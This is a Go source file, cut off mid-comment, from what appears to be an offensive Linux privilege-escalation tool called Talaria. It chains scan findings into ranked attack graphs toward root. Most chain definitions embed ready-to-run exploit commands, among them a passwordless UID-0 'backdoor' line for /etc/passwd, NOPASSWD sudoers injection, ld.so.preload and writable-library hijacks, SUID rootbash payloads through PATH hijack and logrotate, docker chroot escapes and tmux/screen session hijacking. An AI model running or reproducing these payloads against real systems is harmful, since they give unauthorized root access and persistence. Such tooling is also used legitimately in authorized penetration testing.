package core

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"talaria/models"
)

type ChainResult struct {
	Name        string
	Description string
	RiskLevel   string // e.g., "100% CONFIRMED", "POTENTIAL"
	Exploit     string
	TargetPath  string // The core binary/file associated with the chain to check for AppArmor
}

type AttackChain interface {
	Evaluate(report *models.ScanReport) []ChainResult
}

var registeredChains []AttackChain

func init() {
	registeredChains = []AttackChain{
		&WritableScheduledChain{},
		&LDPreloadChain{},
		&LdSoPreloadChain{},         // (#2)
		&SGIDShadowChain{},
		&WritableSSHKeysChain{},
		&WritableSSHDirChain{},
		&PtraceRootChain{},
		&DockerSocketGroupChain{},
		&DockerContainerEscapeChain{},
		&WritablePATHSUIDChain{},    // (#1)
		&SessionHijackChain{},       // (#4)
		&WritableServiceChain{},     // (#3)
		&CriticalFilePermissionsChain{},
		&DangerousCapabilitiesChain{},
		&NfsNoRootSquashChain{},
		&PolkitDangerousRulesChain{},
		&SuidWritableLibChain{},        // E4: SUID + Writable Library Path chain
		&LogrotateRootChain{},          // E1: Logrotate → Root chain
		&EnvFileRootChain{},            // E2: Systemd EnvironmentFile → Root chain
	}
}

func RunIntelligenceEngine(report *models.ScanReport) {
	PrintSectionHeader("Intelligence Engine: Cross-Reference Analysis")

	var allResults []ChainResult
	for _, chain := range registeredChains {
		results := chain.Evaluate(report)
		allResults = append(allResults, results...)
	}

	// Run DFS Graph Analysis — search for ALL goal types
	graph := BuildIntelligenceGraph(report)
	startNode := fmt.Sprintf("user:%s", report.TargetUser)
	
	// Dynamically build goals list from discovered graph nodes
	goals := []string{"goal:root", "goal:sudo", "goal:shadow", "goal:docker_group"}
	for id := range graph.Nodes {
		if strings.HasPrefix(id, "goal:user:") {
			goals = append(goals, id)
		}
	}

	// Helper to collect all file paths from an edge path for defense checking
	collectTargetPaths := func(path []Edge) []string {
		var paths []string
		for _, edge := range path {
			if strings.HasPrefix(edge.To.ID, "file:") || strings.HasPrefix(edge.To.ID, "suid:") {
				p := strings.TrimPrefix(edge.To.ID, "file:")
				p = strings.TrimPrefix(p, "suid:")
				paths = append(paths, p)
			}
			if strings.HasPrefix(edge.From.ID, "file:") || strings.HasPrefix(edge.From.ID, "suid:") {
				p := strings.TrimPrefix(edge.From.ID, "file:")
				p = strings.TrimPrefix(p, "suid:")
				paths = append(paths, p)
			}
		}
		return paths
	}

	// Check if ANY file in the path is blocked by defenses
	isAnyPathBlocked := func(targetPaths []string) (bool, string) {
		for _, tp := range targetPaths {
			if tp == "" {
				continue
			}
			defenses := assessDefenses(tp)
			if defenses.AppArmorEnabled {
				return true, fmt.Sprintf(" [DEFENSE: %s is confined by AppArmor]", tp)
			}
			if defenses.SELinuxEnabled {
				return true, " [DEFENSE: SELinux enforcing on this system]"
			}
			if checkDefenseMechanisms(tp) {
				return true, fmt.Sprintf(" [DEFENSE ACTIVE: %s is confined by AppArmor]", tp)
			}
		}
		return false, ""
	}

	for _, goal := range goals {
		paths := graph.FindPaths(startNode, goal, 5)

		// FindBestPath first — used to deduplicate identical single-path cases
		bestPath := graph.FindBestPath(startNode, goal, 5)
		bestPathKey := ""
		if bestPath != nil {
			for _, e := range bestPath {
				bestPathKey += e.From.ID + e.To.ID
			}
		}

		for _, path := range paths {
			if len(path) == 0 {
				continue
			}

			// Skip if this path is identical to bestPath — it will be shown as Best Attack Graph
			pathKey := ""
			for _, e := range path {
				pathKey += e.From.ID + e.To.ID
			}
			if pathKey == bestPathKey {
				continue
			}

			desc := "Attack Path:\n"
			for i, edge := range path {
				desc += fmt.Sprintf("  %d. %s -> (%s) -> %s (weight:%d)\n", i+1, edge.From.ID, edge.Description, edge.To.ID, edge.Weight)
			}

			targetPaths := collectTargetPaths(path)

			goalName := strings.TrimPrefix(goal, "goal:")
			riskLevel := "100% CONFIRMED"
			if strings.HasPrefix(goal, "goal:user:") {
				riskLevel = "LATERAL MOVEMENT CONFIRMED"
				desc += "\n  [!] Tactical Advice: Once you have gained access as this user, run Talaria again to explore further paths."
			}

			blocked, blockMsg := isAnyPathBlocked(targetPaths)
			if blocked {
				riskLevel = "POTENTIAL - BLOCKED BY DEFENSE"
				desc += blockMsg
			}

			allResults = append(allResults, ChainResult{
				Name:        fmt.Sprintf("Attack Graph: %s (%d steps) → %s", goalName, len(path), goalName),
				Description: desc,
				RiskLevel:   riskLevel,
				TargetPath:  strings.Join(targetPaths, ","),
			})
		}

		// Best path entry — always shown if a path exists
		if bestPath != nil {
			totalWeight := 0
			desc := "Best Attack Path:\n"
			for i, edge := range bestPath {
				totalWeight += edge.Weight
				desc += fmt.Sprintf("  %d. %s -> (%s) [weight:%d] -> %s\n", i+1, edge.From.ID, edge.Description, edge.Weight, edge.To.ID)
			}

			targetPaths := collectTargetPaths(bestPath)

			goalName := strings.TrimPrefix(goal, "goal:")
			riskLevel := "100% CONFIRMED"
			if strings.HasPrefix(goal, "goal:user:") {
				riskLevel = "LATERAL MOVEMENT CONFIRMED"
				desc += "\n  [!] Tactical Advice: Once you have gained access as this user, run Talaria again to explore further paths."
			}

			blocked, blockMsg := isAnyPathBlocked(targetPaths)
			if blocked {
				riskLevel = "POTENTIAL - BLOCKED BY DEFENSE"
				desc += blockMsg
			}

			allResults = append(allResults, ChainResult{
				Name:        fmt.Sprintf("Best Attack Graph: %s (%d steps, score=%d) → %s", goalName, len(bestPath), totalWeight, goalName),
				Description: desc,
				RiskLevel:   riskLevel,
				TargetPath:  strings.Join(targetPaths, ","),
			})
		}
	}

	if len(allResults) == 0 {
		fmt.Printf("%s[+] No confirmed chained attack vectors found via cross-reference.%s\n", ColorGreen, ColorReset)
		return
	}

	// Apply Context-Aware Downgrading (AppArmor / SELinux Checks) (#9)
	for i, res := range allResults {
		if res.RiskLevel == "100% CONFIRMED" {
			defenses := assessDefenses(res.TargetPath)
			if defenses.AppArmorEnabled || defenses.SELinuxEnabled {
				allResults[i].RiskLevel = "POTENTIAL - BLOCKED BY DEFENSE"
				sb := res.Description
				if defenses.AppArmorEnabled {
					sb += fmt.Sprintf(" [DEFENSE: %s is confined by AppArmor]", res.TargetPath)
				}
				if defenses.SELinuxEnabled {
					sb += fmt.Sprintf(" [DEFENSE: SELinux enforcing on this system]")
				}
				allResults[i].Description = sb
			} else if res.TargetPath != "" {
				if checkDefenseMechanisms(res.TargetPath) {
					allResults[i].RiskLevel = "POTENTIAL - BLOCKED BY APPARMOR"
					if allResults[i].Description != "" {
						allResults[i].Description += " | "
					}
					allResults[i].Description += fmt.Sprintf("[DEFENSE ACTIVE: %s is confined by AppArmor]", res.TargetPath)
				}
			}
		}
	}

	// C4: Deduplicate chain results — same Name+TargetPath can appear from multiple chains or DFS paths
	seen := make(map[string]bool)
	for _, res := range allResults {
		dedup := res.Name + "|" + res.TargetPath
		if seen[dedup] {
			continue
		}
		seen[dedup] = true

		severity := "HIGH"
		if res.RiskLevel == "100% CONFIRMED" {
			severity = "CRITICAL"
		} else if res.RiskLevel == "LATERAL MOVEMENT CONFIRMED" {
			severity = "LATERAL MOVEMENT CONFIRMED"
		} else if strings.Contains(res.RiskLevel, "POTENTIAL") {
			severity = "MEDIUM"
		}

		details := map[string]string{}
		if res.Description != "" {
			// Format attack path with tree characters if it looks like one
			lines := strings.Split(res.Description, "\n")
			formattedDesc := ""
			for i, line := range lines {
				line = strings.TrimSpace(line)
				if line == "" { continue }
				
				if strings.Contains(line, "->") {
					formattedDesc += "\n       " + ColorCyan + "→ " + ColorReset + line
				} else {
					formattedDesc += line
				}
				if i < len(lines)-1 {
					formattedDesc += " "
				}
			}
			details["Path"] = formattedDesc
		}
		
		PrintFinding(severity, res.Name, details, res.Exploit)
	}
}

// ── Defense Assessment (#9) ──────────────────────────────────────────────

// DefenseStatus holds the results of defense mechanism checks
type DefenseStatus struct {
	AppArmorEnabled bool
	SELinuxEnabled  bool
	IsContainer     bool
}

// assessDefenses checks multiple defense layers for a target path
func assessDefenses(targetPath string) DefenseStatus {
	status := DefenseStatus{}

	// Check AppArmor via /proc/self/attr/apparmor/current
	if data, err := os.ReadFile("/proc/self/attr/apparmor/current"); err == nil {
		profile := strings.TrimSpace(string(data))
		if profile != "" && profile != "unconfined" {
			status.AppArmorEnabled = true
		}
	}

	// Check SELinux via /proc/self/attr/current or /selinux/enforce
	if data, err := os.ReadFile("/proc/self/attr/current"); err == nil {
		ctx := strings.TrimSpace(string(data))
		if len(ctx) > 0 && !strings.Contains(ctx, "unconfined") && strings.Contains(ctx, ":") {
			status.SELinuxEnabled = true
		}
	}

	// Check /selinux/enforce as alternative
	if _, err := os.Stat("/selinux/enforce"); err == nil {
		if data, err := os.ReadFile("/selinux/enforce"); err == nil {
			if strings.TrimSpace(string(data)) == "1" {
				status.SELinuxEnabled = true
			}
		}
	}

	return status
}

// ── CHAIN 1: Writable script/binary vs. scheduled execution ──────────────
type WritableScheduledChain struct{}

func (c *WritableScheduledChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, w := range report.Writeable {
		if w.IsExecutable || strings.HasSuffix(w.Path, ".sh") || strings.HasSuffix(w.Path, ".py") ||
			strings.HasSuffix(w.Path, ".pl") || strings.HasSuffix(w.Path, ".rb") {

			// 1a. Writable file executed by a root CronJob
			for _, cron := range report.CronJobs {
				if cron.IsRootJob && resolveCommandPath(cron.Command, w.Path) {
					results = append(results, ChainResult{
						Name:        fmt.Sprintf("Writable '%s' executed by root CronJob", w.Path),
						Description: fmt.Sprintf("Command: %s", cron.Command),
						RiskLevel:   "100% CONFIRMED",
						TargetPath:  w.Path,
					})
				}
			}

			// 1b. Writable file runnable via Sudo
			for _, sudo := range report.SudoPrivileges {
				if resolveCommandPath(sudo.Command, w.Path) {
					results = append(results, ChainResult{
						Name:        fmt.Sprintf("Writable '%s' can be run via Sudo", w.Path),
						Description: fmt.Sprintf("Command: %s", sudo.Command),
						RiskLevel:   "100% CONFIRMED",
						TargetPath:  w.Path,
					})
				}
			}

			// 1c. Writable Systemd unit file
			for _, sysd := range report.SystemdTimers {
				if sysd.Path == w.Path {
					results = append(results, ChainResult{
						Name:        fmt.Sprintf("Writable systemd unit: %s", w.Path),
						RiskLevel:   "100% CONFIRMED",
						Description: "Will be executed with root privileges on next timer trigger.",
						TargetPath:  w.Path,
					})
				}
			}
		}
	}
	return results
}

// ── CHAIN 2: LD_PRELOAD env_keep + any NOPASSWD entry ──────────────
type LDPreloadChain struct{}

func (c *LDPreloadChain) Evaluate(report *models.ScanReport) []ChainResult {
	hasLDPreload := false
	hasNoPassword := false
	for _, s := range report.SudoPrivileges {
		if s.HasLDPreload {
			hasLDPreload = true
		}
		if s.NoPassword {
			hasNoPassword = true
		}
	}
	if hasLDPreload && hasNoPassword {
		return []ChainResult{{
			Name:        "LD_PRELOAD in env_keep + NOPASSWD entry detected",
			RiskLevel:   "100% CONFIRMED",
			Description: "Compile a .so with __attribute__((constructor)) { setuid(0); system('/bin/bash'); }",
			Exploit:     "Set LD_PRELOAD=<your.so>, run any NOPASSWD sudo command → root shell.",
		}}
	}
	return nil
}

// ── CHAIN 2b: LD_SO_PRELOAD /etc/ld.so.preload writable (#2) ──────────
type LdSoPreloadChain struct{}

func (c *LdSoPreloadChain) Evaluate(report *models.ScanReport) []ChainResult {
	// Check if /etc/ld.so.preload exists and is writable
	for _, w := range report.Writeable {
		if w.Path == "/etc/ld.so.preload" && w.IsDangerous {
			return []ChainResult{{
				Name:        "/etc/ld.so.preload is writable",
				RiskLevel:   "100% CONFIRMED",
				Description: "Write a malicious shared library path to /etc/ld.so.preload. Every SUID binary run afterwards will load it.",
				Exploit:     "echo '/tmp/malicious.so' > /etc/ld.so.preload → run any SUID binary → root shell",
				TargetPath:  "/etc/ld.so.preload",
			}}
		}
	}

	// Also check /etc/ld.so.conf.d/ for writable config files
	for _, w := range report.Writeable {
		if strings.HasPrefix(w.Path, "/etc/ld.so.conf.d/") && w.IsDangerous {
			risk := "POTENTIAL (Dormant Vector)"
			desc := "Add a malicious library path to ldconfig. Requires ldconfig execution (e.g. system update or admin maintenance) to update cache."
			if isLdconfigAutomated(report) {
				risk = "100% CONFIRMED"
				desc = "Add a malicious library path to ldconfig. Automated ldconfig execution detected — loads on next cycle."
			}
			return []ChainResult{{
				Name:        fmt.Sprintf("Writable ld.so.conf.d entry: %s", w.Path),
				RiskLevel:   risk,
				Description: desc,
				Exploit:     "Add '/tmp' to the config. Will execute as root when ldconfig is triggered during next system update or maintenance.",
				TargetPath:  w.Path,
			}}
		}
	}

	return nil
}

// ── CHAIN 3: SGID binary owned by 'shadow' group ──────────────
type SGIDShadowChain struct{}

func (c *SGIDShadowChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, sgid := range report.SGID {
		if sgid.IsDangerous && strings.EqualFold(sgid.OwnerGroup, "shadow") {
			results = append(results, ChainResult{
				Name:        fmt.Sprintf("SGID binary '%s' owned by shadow group", sgid.Path),
				RiskLevel:   "100% CONFIRMED",
				Description: "Execute it to gain shadow group privileges → read /etc/shadow → crack hashes.",
				TargetPath:  sgid.Path,
			})
		}
	}
	return results
}

// ── CHAIN 4: Writable authorized_keys + active SSH service ──────────────
type WritableSSHKeysChain struct{}

func (c *WritableSSHKeysChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, sshKey := range report.SSHKeys {
		if sshKey.IsDangerous && sshKey.Type == "authorized_keys" {
			for _, netConn := range report.NetworkConnections {
				if netConn.LocalPort == 22 && netConn.State == "LISTEN" {
					results = append(results, ChainResult{
						Name:        fmt.Sprintf("Writable authorized_keys for '%s' + SSH listening on :22", sshKey.TargetUser),
						RiskLevel:   "100% CONFIRMED",
						Exploit:     fmt.Sprintf("Append your public key to '%s' -> ssh %s@localhost", sshKey.Path, sshKey.TargetUser),
						TargetPath:  sshKey.Path,
					})
				}
			}
		}
	}
	return results
}

// ── CHAIN 5: Writable .ssh directory + SSH service ──────────────
type WritableSSHDirChain struct{}

func (c *WritableSSHDirChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, sshKey := range report.SSHKeys {
		if sshKey.IsDangerous && sshKey.Type == ".ssh directory" {
			for _, netConn := range report.NetworkConnections {
				if netConn.LocalPort == 22 && netConn.State == "LISTEN" {
					results = append(results, ChainResult{
						Name:        fmt.Sprintf("Writable .ssh/ dir for '%s' + SSH on :22", sshKey.TargetUser),
						RiskLevel:   "100% CONFIRMED",
						Exploit:     fmt.Sprintf("Create '%s/authorized_keys' with your pubkey -> ssh %s@localhost", sshKey.Path, sshKey.TargetUser),
						TargetPath:  sshKey.Path,
					})
				}
			}
		}
	}
	return results
}

// ── CHAIN 6: ptrace scope=0 + root process running ──────────────
type PtraceRootChain struct{}

func (c *PtraceRootChain) Evaluate(report *models.ScanReport) []ChainResult {
	if report.PtraceScope != nil && report.PtraceScope.IsDangerous {
		currentUID := os.Getuid()
		for _, proc := range report.Processes {
			if proc.UID == 0 {
				if currentUID == 0 {
					return []ChainResult{{
						Name:        fmt.Sprintf("ptrace unrestricted + root process PID %d (%s)", proc.PID, proc.Command),
						RiskLevel:   "100% CONFIRMED",
						Description: "As root, you can inject shellcode into other processes for hijacking, stealth, or lateral movement.",
					}}
				} else {
					return []ChainResult{{
						Name:        fmt.Sprintf("ptrace unrestricted + root process PID %d (%s)", proc.PID, proc.Command),
						RiskLevel:   "POTENTIAL",
						Description: "Exploitation requires CAP_SYS_PTRACE. If possessed, you can inject shellcode to escalate privileges.",
					}}
				}
			}
		}
	}
	return nil
}

// ── CHAIN 7: Docker socket accessible + docker group membership ──────────────
type DockerSocketGroupChain struct{}

func (c *DockerSocketGroupChain) Evaluate(report *models.ScanReport) []ChainResult {
	hasDockerSocket := false
	for _, sock := range report.Sockets {
		if strings.Contains(sock.Service, "docker") && sock.IsDangerous {
			hasDockerSocket = true
		}
	}
	hasDockerGroup := false
	for _, grp := range report.Groups {
		if strings.EqualFold(grp.GroupName, "docker") {
			hasDockerGroup = true
		}
	}
	if hasDockerSocket || hasDockerGroup {
		return []ChainResult{{
			Name:        fmt.Sprintf("Docker socket accessible (group=%v, socket=%v)", hasDockerGroup, hasDockerSocket),
			RiskLevel:   "100% CONFIRMED",
			Exploit:     "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
		}}
	}
	return nil
}

// ── CHAIN 8: Container with docker.sock mount ──────────────
type DockerContainerEscapeChain struct{}

func (c *DockerContainerEscapeChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, ce := range report.ContainerEscape {
		if ce.IsDangerous && strings.Contains(ce.Vector, "Docker Socket") {
			for _, sock := range report.Sockets {
				if strings.Contains(sock.Service, "docker") {
					results = append(results, ChainResult{
						Name:        "Docker socket mounted INSIDE container",
						RiskLevel:   "100% CONFIRMED",
						Exploit:     "docker run -v /:/host --rm -it alpine chroot /host sh → full host root",
					})
				}
			}
		}
	}
	return results
}

// ── CHAIN 9: Writable PATH + SUID binary cross-chain (#1) ──────────────
type WritablePATHSUIDChain struct{}

func (c *WritablePATHSUIDChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult

	for _, ph := range report.PATHHijack {
		if !ph.IsDangerous || !ph.IsWriteable {
			continue
		}

		for _, suid := range report.SUID {
			if !suid.IsDangerous {
				continue
			}
			// Check if the SUID binary is a script (not ELF) that might use PATH-resolved commands
			if strings.HasSuffix(suid.Path, ".sh") || strings.HasSuffix(suid.Path, ".py") ||
				strings.HasSuffix(suid.Path, ".pl") || strings.HasSuffix(suid.Path, ".rb") {
				results = append(results, ChainResult{
					Name:        fmt.Sprintf("Writable PATH entry '%s' can hijack SUID script '%s'", ph.Directory, suid.Path),
					RiskLevel:   "100% CONFIRMED",
					Description: fmt.Sprintf("Place a malicious binary named after a common command (ls, cp, ps) in %s. When the SUID script runs, it executes your payload as root.", ph.Directory),
					Exploit:     fmt.Sprintf("echo '#!/bin/sh\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > %s/ls && chmod +x %s/ls && PATH=%s:$PATH %s", ph.Directory, ph.Directory, ph.Directory, suid.Path),
					TargetPath:  suid.Path,
				})
			}
		}
	}

	return results
}

// isLdconfigAutomated checks if ldconfig is executed automatically by system cron or systemd timers.
func isLdconfigAutomated(report *models.ScanReport) bool {
	if report == nil {
		return false
	}
	for _, c := range report.CronJobs {
		if strings.Contains(c.Command, "ldconfig") {
			return true
		}
	}
	for _, s := range report.SystemdTimers {
		if strings.Contains(s.Path, "ldconfig") || strings.Contains(s.Reason, "ldconfig") {
			return true
		}
	}
	return false
}

// ── CHAIN 10: Session hijack (tmux/screen) to root (#4) ──────────────
type SessionHijackChain struct{}

func (c *SessionHijackChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, sh := range report.SessionHijack {
		if sh.IsDangerous && strings.Contains(sh.TargetUser, "root") {
			results = append(results, ChainResult{
				Name:        fmt.Sprintf("Tmux/Screen session of root hijackable via '%s'", sh.Path),
				RiskLevel:   "100% CONFIRMED",
				Description: "Attach to the root tmux/screen session and execute commands with root privileges.",
				Exploit:     fmt.Sprintf("tmux -S %s attach || screen -x root/", sh.Path),
				TargetPath:  sh.Path,
			})
		}
	}
	return results
}

// ── CHAIN 11: Writable systemd service files (#3) ──────────────
type WritableServiceChain struct{}

func (c *WritableServiceChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, w := range report.Writeable {
		if strings.Contains(w.Type, "Writable Systemd Service") || strings.Contains(w.Type, "Systemd Generator Writable") {
			results = append(results, ChainResult{
				Name:        fmt.Sprintf("Writable systemd unit: %s", w.Path),
				RiskLevel:   "100% CONFIRMED",
				Description: "Modify ExecStart to execute a malicious command as root on next service restart or system boot.",
				Exploit:     fmt.Sprintf("echo -e '[Service]\\nExecStart=/tmp/rootshell\\n' > %s && systemctl daemon-reload && systemctl restart <service>", w.Path),
				TargetPath:  w.Path,
			})
		}
	}
	return results
}

// resolveCommandPath intelligently checks if a command string eventually targets a specific file path.
// It handles: direct absolute paths, basename (PATH-resolved), cd+command patterns with filepath.Abs.
func resolveCommandPath(command string, targetPath string) bool {
	// Direct match (absolute path used in command)
	if strings.Contains(command, targetPath) {
		return true
	}

	// Basename match for PATH-resolved execution
	targetParts := strings.Split(targetPath, "/")
	if len(targetParts) > 0 {
		baseName := targetParts[len(targetParts)-1]
		if command == baseName || strings.HasPrefix(command, baseName+" ") || strings.Contains(command, " "+baseName) || strings.Contains(command, "./"+baseName) {
			return true
		}
	}

	// Handle 'cd <dir> && <cmd>' or 'cd <dir>; <cmd>'
	parts := strings.Split(command, "&&")
	if len(parts) == 1 {
		parts = strings.Split(command, ";")
	}

	// Track current directory for 'cd dir && cmd' patterns
	var currentDir string
	for _, part := range parts {
		part = strings.TrimSpace(part)

		if strings.HasPrefix(part, "cd ") {
			currentDir = strings.TrimSpace(strings.TrimPrefix(part, "cd "))
		} else if currentDir != "" {
			cmdFields := strings.Fields(part)
			if len(cmdFields) > 0 {
				var execName string
				// interpreters like "bash script.sh" → script is the 2nd arg
				interpreters := map[string]bool{"bash": true, "sh": true, "python": true, "python3": true, "perl": true, "ruby": true}
				if interpreters[cmdFields[0]] && len(cmdFields) > 1 {
					execName = cmdFields[1]
				} else {
					execName = cmdFields[0]
				}

				if execName != "" {
					execName = strings.TrimPrefix(execName, "./")

					// Build the resolved path and normalize it via filepath.Abs
					fullPath := currentDir + "/" + execName
					resolvedPath, err := filepath.Abs(fullPath)
					if err != nil {
						resolvedPath = fullPath
					}

					if resolvedPath == targetPath {
						return true
					}
				}
			}
		}
	}
	return false
}

// checkDefenseMechanisms statically checks if an AppArmor profile exists for the given path
func checkDefenseMechanisms(targetPath string) bool {
	if targetPath == "" {
		return false
	}

	basePath := strings.TrimPrefix(targetPath, "/")
	profileName := strings.ReplaceAll(basePath, "/", ".")

	apparmorProfile := fmt.Sprintf("/etc/apparmor.d/%s", profileName)
	if _, err := os.Stat(apparmorProfile); err == nil {
		return true
	}

	return false
}

// ── CHAIN 12: Critical File Permissions ──────────────
type CriticalFilePermissionsChain struct{}

func (c *CriticalFilePermissionsChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, fp := range report.FilePermissions {
		if !fp.IsDangerous {
			continue
		}
		if fp.Path == "/etc/passwd" && (fp.IsWorldWritable || fp.IsGroupWritable) {
			results = append(results, ChainResult{
				Name:        "Critical system file /etc/passwd is writable",
				RiskLevel:   "100% CONFIRMED",
				Description: "Add a new user with root UID 0 directly into /etc/passwd.",
				Exploit:     "echo 'backdoor::0:0:root:/root:/bin/bash' >> /etc/passwd && su backdoor",
				TargetPath:  fp.Path,
			})
		} else if fp.Path == "/etc/shadow" {
			if fp.IsWorldWritable || fp.IsGroupWritable {
				results = append(results, ChainResult{
					Name:        "Critical system file /etc/shadow is writable",
					RiskLevel:   "100% CONFIRMED",
					Description: "Change the root password hash directly inside /etc/shadow.",
					Exploit:     "Replace root hash with a known hash → su root",
					TargetPath:  fp.Path,
				})
			} else if fp.IsWorldReadable || fp.Permissions == "readable" {
				results = append(results, ChainResult{
					Name:        "Critical sensitive file /etc/shadow is readable",
					RiskLevel:   "100% CONFIRMED",
					Description: "Read root and other system user hashes offline to crack them.",
					Exploit:     "cat /etc/shadow | grep root",
					TargetPath:  fp.Path,
				})
			}
		} else if fp.Path == "/etc/sudoers" && (fp.IsWorldWritable || fp.IsGroupWritable) {
			results = append(results, ChainResult{
				Name:        "Critical system file /etc/sudoers is writable",
				RiskLevel:   "100% CONFIRMED",
				Description: "Insert NOPASSWD privileges for current user into sudoers config.",
				Exploit:     fmt.Sprintf("echo '%s ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && sudo -i", report.TargetUser),
				TargetPath:  fp.Path,
			})
		} else if strings.HasPrefix(fp.Path, "/etc/sudoers.d/") && (fp.IsWorldWritable || fp.IsGroupWritable) {
			results = append(results, ChainResult{
				Name:        fmt.Sprintf("Sudoers drop-in file '%s' is writable", fp.Path),
				RiskLevel:   "100% CONFIRMED",
				Description: "Insert NOPASSWD privileges for current user into the drop-in file.",
				Exploit:     fmt.Sprintf("echo '%s ALL=(ALL) NOPASSWD: ALL' >> %s && sudo -i", report.TargetUser, fp.Path),
				TargetPath:  fp.Path,
			})
		}
	}
	return results
}

// ── CHAIN 13: Dangerous Capabilities ──────────────
type DangerousCapabilitiesChain struct{}

func (c *DangerousCapabilitiesChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, capResult := range report.Capabilities {
		if !capResult.IsDangerous {
			continue
		}
		capsLower := strings.ToLower(capResult.Capabilities)
		if strings.Contains(capsLower, "cap_setuid") || strings.Contains(capsLower, "cap_sys_admin") || strings.Contains(capsLower, "cap_dac_override") {
			results = append(results, ChainResult{
				Name:        fmt.Sprintf("Binary '%s' possesses dangerous capability: %s", capResult.Path, capResult.Capabilities),
				RiskLevel:   "100% CONFIRMED",
				Description: "Abuse the capability on the binary to gain full root capabilities.",
				Exploit:     capResult.ExploitHint,
				TargetPath:  capResult.Path,
			})
		} else if strings.Contains(capsLower, "cap_dac_read_search") {
			results = append(results, ChainResult{
				Name:        fmt.Sprintf("Binary '%s' possesses file read bypass capability: %s", capResult.Path, capResult.Capabilities),
				RiskLevel:   "100% CONFIRMED",
				Description: "Abuse capability to read sensitive files (e.g. /etc/shadow) directly.",
				Exploit:     fmt.Sprintf("%s /etc/shadow", capResult.Path),
				TargetPath:  capResult.Path,
			})
		}
	}
	return results
}

// ── CHAIN 14: NFS Exports no_root_squash ──────────────
type NfsNoRootSquashChain struct{}

func (c *NfsNoRootSquashChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, nfs := range report.NFSExports {
		if nfs.IsDangerous && nfs.IsWritable && nfs.HasNoRootSquash {
			results = append(results, ChainResult{
				Name:        fmt.Sprintf("NFS Export '%s' is writable with no_root_squash", nfs.Path),
				RiskLevel:   "100% CONFIRMED",
				Description: "Mount the share from a remote client, upload a SUID root shell, and execute it locally.",
				Exploit:     fmt.Sprintf("Mount %s remotely -> cp /bin/bash ./shell && chmod +s ./shell -> run locally", nfs.Path),
				TargetPath:  nfs.Path,
			})
		}
	}
	return results
}

// ── CHAIN 15: Dangerous Polkit Rules ──────────────
type PolkitDangerousRulesChain struct{}

func (c *PolkitDangerousRulesChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, pk := range report.PolkitRules {
		if !pk.IsDangerous {
			continue
		}
		results = append(results, ChainResult{
			Name:        fmt.Sprintf("Polkit JS rule in '%s' grants passwordless authorization", pk.FilePath),
			RiskLevel:   "100% CONFIRMED",
			Description: fmt.Sprintf("Allows any user or vulnerable group to run action '%s' without credentials.", pk.Action),
			Exploit:     fmt.Sprintf("Trigger the action via pkexec or dbus interface: %s", pk.Action),
			TargetPath:  pk.FilePath,
		})
	}
	return results
}

// ── CHAIN 16: SUID + Writable Library Path (E4) ──────────────
type SuidWritableLibChain struct{}

func (c *SuidWritableLibChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, suid := range report.SUID {
		if len(suid.WritableLibraryPaths) == 0 {
			continue
		}
		results = append(results, ChainResult{
			Name:        fmt.Sprintf("SUID '%s' has writable library path → .so hijack", filepath.Base(suid.Path)),
			RiskLevel:   "100% CONFIRMED",
			Description: fmt.Sprintf("SUID binary %s loads libraries from writable path(s): %s", suid.Path, strings.Join(suid.WritableLibraryPaths, ", ")),
			Exploit:     fmt.Sprintf("gcc -shared -fPIC -o %s/evil.so evil.c && %s  # .so is loaded with root privileges", suid.WritableLibraryPaths[0], suid.Path),
			TargetPath:  suid.Path,
		})
	}
	return results
}

// ── CHAIN 17: Logrotate → Root Execution (E1) ──────────────────────────────
// Cross-references writable logrotate configs (from A3 scanner) to confirm
// a root code-execution chain.
//
// Two distinct sub-cases:
//  1. The logrotate config file itself is writable — attacker can inject any
//     postrotate command that runs as root the next time logrotate runs.
//  2. The config is not writable but references a postrotate script that IS
//     writable — attacker modifies the script, same outcome.
type LogrotateRootChain struct{}

func (c *LogrotateRootChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, lr := range report.Logrotate {
		if lr.IsWritable {
			// Case 1: the config itself is writable
			results = append(results, ChainResult{
				Name:        fmt.Sprintf("Writable logrotate config '%s' → root code execution", lr.ConfigPath),
				RiskLevel:   "100% CONFIRMED",
				Description: fmt.Sprintf("Logrotate config %s is writable. Injecting a postrotate block causes arbitrary commands to execute as root on the next log rotation (typically daily via cron/systemd timer).", lr.ConfigPath),
				Exploit: fmt.Sprintf(
					"echo -e 'postrotate\n\tcp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\nendscript' >> %s  # wait for logrotate to run → /tmp/rootbash -p",
					lr.ConfigPath,
				),
				TargetPath: lr.ConfigPath,
			})
		} else {
			// Case 2: a referenced postrotate script is writable
			for _, script := range lr.PostrotatePaths {
				results = append(results, ChainResult{
					Name:        fmt.Sprintf("Writable postrotate script '%s' → root code execution", script),
					RiskLevel:   "100% CONFIRMED",
					Description: fmt.Sprintf("Logrotate config '%s' calls postrotate script '%s' which is writable. Modifying the script causes it to execute as root during the next log rotation.", lr.ConfigPath, script),
					Exploit:     fmt.Sprintf("echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> %s  # wait for logrotate → /tmp/rootbash -p", script),
					TargetPath:  script,
				})
			}
		}
	}
	return results
}

// ── CHAIN 18: Systemd EnvironmentFile → Root Code Execution (E2) ──────────────
// Cross-references writable EnvironmentFile findings (from A6 scanner) to
// confirm a root code-execution chain via service restart.
//
// Attack path:
//  1. Attacker writes LD_PRELOAD=/tmp/evil.so (or PATH=/tmp:$PATH) into the
